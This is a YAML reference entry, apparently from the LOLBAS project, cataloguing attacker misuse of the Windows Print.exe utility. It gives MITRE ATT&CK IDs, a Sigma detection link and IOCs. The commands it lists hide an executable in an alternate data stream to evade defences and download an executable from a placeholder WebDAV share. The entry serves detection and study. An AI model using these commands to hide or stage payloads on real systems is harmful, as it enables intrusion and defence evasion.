---
Name: Print.exe
Description: Used by Windows to send files to the printer
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe
    Description: Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
    Usecase: Hide binary file in alternate data stream to potentially bypass defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe
    Description: Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe
    Usecase: Copy files
    Category: Copy
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe
    Description: Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
    Usecase: Copy/Download file from remote server
    Category: Copy
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\print.exe
  - Path: C:\Windows\SysWOW64\print.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_print.yml
  - IOC: Print.exe retrieving files from internet
  - IOC: Print.exe creating executable files on disk
Resources:
  - Link: https://twitter.com/Oddvarmoe/status/985518877076541440
  - Link: https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
